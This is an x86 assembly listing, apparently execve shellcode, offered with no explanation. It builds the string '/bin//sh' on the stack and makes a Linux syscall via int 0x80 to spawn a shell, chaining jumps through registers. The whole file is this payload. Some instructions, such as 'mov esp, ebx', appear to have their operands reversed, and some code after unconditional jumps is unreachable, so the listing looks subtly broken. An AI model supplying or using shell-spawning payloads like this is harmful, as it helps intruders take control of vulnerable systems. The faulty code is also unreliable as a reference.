section .text
global start
global main

start:
main:
push   ebp
mov    ebp, esp
mov    esi, edx
add    esi, 12
jmp    esi
add    edx, 12
jmp    edx
xor    eax, eax
push   eax
jmp    esi
push   0x68732f2f
jmp    esi
push   0x6e69622f
jmp    esi
mov    esp, ebx
push   eax
push   ebx
jmp    esi
mov    esp, ecx
mov    al, 0xb
jmp    esi
int    0x80
ret
leave